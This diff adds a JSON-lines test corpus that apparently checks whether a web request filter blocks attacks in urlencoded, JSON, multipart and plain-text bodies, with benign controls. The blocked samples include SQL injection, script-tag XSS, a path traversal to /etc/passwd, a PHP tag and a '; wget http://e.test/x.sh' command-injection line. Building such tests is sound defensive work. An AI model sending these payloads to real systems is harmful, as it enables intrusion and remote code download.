@@ -1,0 +1,18 @@
+# Body corpus (PK-154): attacks and ordinary content inside urlencoded, JSON, multipart and plain bodies.
+{"method":"POST","path":"/f","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"a=1&b=2&c=%27+or+1%3D1--","expect":"block","note":"urlencoded value"}
+{"method":"POST","path":"/f","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"1+union+select+2=x","expect":"block","note":"urlencoded name"}
+{"method":"POST","path":"/f","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"a=1&b=hello+world&c=%E6%97%A5%E6%9C%AC%E8%AA%9E","expect":"pass","note":"urlencoded benign"}
+{"method":"POST","path":"/j","headers":{"Content-Type":"application/json"},"body":"{\"a\":{\"b\":{\"c\":{\"d\":[1,2,{\"e\":\"<script>x</script>\"}]}}}}","expect":"block","note":"json deep leaf"}
+{"method":"POST","path":"/j","headers":{"Content-Type":"application/json"},"body":"{\"1 union select 2\":1}","expect":"block","note":"json key"}
+{"method":"POST","path":"/j","headers":{"Content-Type":"application/json; charset=utf-8"},"body":"{\"list\":[\"a\",\"b\",\"../../etc/passwd\"]}","expect":"block","note":"json array element"}
+{"method":"POST","path":"/j","headers":{"Content-Type":"application/json"},"body":"{\"text\":\"ありがとうございます。select は選択という意味です。\"}","expect":"pass","note":"json japanese"}
+{"method":"POST","path":"/j","headers":{"Content-Type":"application/json"},"body":"{\"n\":1,\"f\":2.5,\"t\":true,\"z\":null,\"s\":\"plain\"}","expect":"pass","note":"json scalars"}
+{"method":"POST","path":"/j","headers":{"Content-Type":"application/json"},"body":"{\"broken\": <script>alert(1)</script>","expect":"block","note":"json that does not parse is read raw"}
+{"method":"POST","path":"/m","headers":{"Content-Type":"multipart/form-data; boundary=XX"},"body":"--XX\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n1' or 1=1--\r\n--XX--\r\n","expect":"block","note":"multipart field"}
+{"method":"POST","path":"/m","headers":{"Content-Type":"multipart/form-data; boundary=XX"},"body":"--XX\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nhello\r\n--XX\r\nContent-Disposition: form-data; name=\"b\"\r\n\r\n<script>alert(1)</script>\r\n--XX--\r\n","expect":"block","note":"multipart second field"}
+{"method":"POST","path":"/m","headers":{"Content-Type":"multipart/form-data; boundary=XX"},"body":"--XX\r\nContent-Disposition: form-data; name=\"f\"; filename=\"ok.png\"\r\nContent-Type: image/png\r\n\r\n<script>this is binary noise</script>\r\n--XX--\r\n","expect":"pass","note":"binary part content is not read"}
+{"method":"POST","path":"/m","headers":{"Content-Type":"multipart/form-data; boundary=XX"},"body":"--XX\r\nContent-Disposition: form-data; name=\"f\"; filename=\"note.txt\"\r\nContent-Type: text/plain\r\n\r\n<script>alert(1)</script>\r\n--XX--\r\n","expect":"block","note":"text part content is read"}
+{"method":"POST","path":"/t","headers":{"Content-Type":"text/plain"},"body":"just some ordinary text, with punctuation: ; | & ` and quotes ' \" -- fine","expect":"pass","note":"plain benign"}
+{"method":"POST","path":"/t","headers":{"Content-Type":"text/plain"},"body":"line one\n; wget http://e.test/x.sh\nline three","expect":"block","note":"plain with a command"}
+{"method":"POST","path":"/t","body":"<?php echo 1; ?>","expect":"block","note":"no content type"}
+{"method":"POST","path":"/x","headers":{"Content-Type":"application/xml"},"body":"<?xml version=\"1.0\"?><a><b>text</b></a>","expect":"pass","note":"xml declaration is not php"}
